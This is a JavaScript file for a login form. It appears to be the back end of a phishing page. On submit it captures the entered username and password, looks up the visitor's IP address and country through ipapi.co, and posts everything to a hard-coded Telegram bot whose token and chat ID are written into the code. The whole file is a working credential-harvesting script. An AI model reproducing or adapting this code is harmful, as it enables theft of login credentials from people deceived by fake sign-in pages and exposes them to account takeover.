document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (event) {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Input validation
        if (!username || !password) {
            alert('Both username and password are required.');
            return;
        }

        console.log("Username and password captured successfully.");

        // Fetch IP and location information
        fetch('https://ipapi.co/json/')
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Failed to fetch IP info. HTTP status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                const ip = data.ip || 'Unavailable';
                const country = data.country_name || 'Unavailable';

                console.log(`IP fetched: ${ip}, Country fetched: ${country}`);

                // Prepare the message to send
                const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}`;
                sendToTelegram(message);
            })
            .catch(error => {
                console.error('Error fetching IP information:', error);
                alert('Failed to fetch location details. Check your network connection.');
            });
    });

    function sendToTelegram(message) {
        // Replace with your actual bot token and chat ID
        const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
        const chatId = '6651292809';
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const payload = {
            chat_id: chatId,
            text: message
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Telegram API error. HTTP status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (!data.ok) {
                    throw new Error(`Telegram API error: ${data.description}`);
                }
                console.log('Message sent to Telegram successfully.');
                alert('Message sent successfully.');
            })
            .catch(error => {
                console.error('Error sending message to Telegram:', error);
                alert('Failed to send message to Telegram. Check your bot configuration.');
            });
    }
});
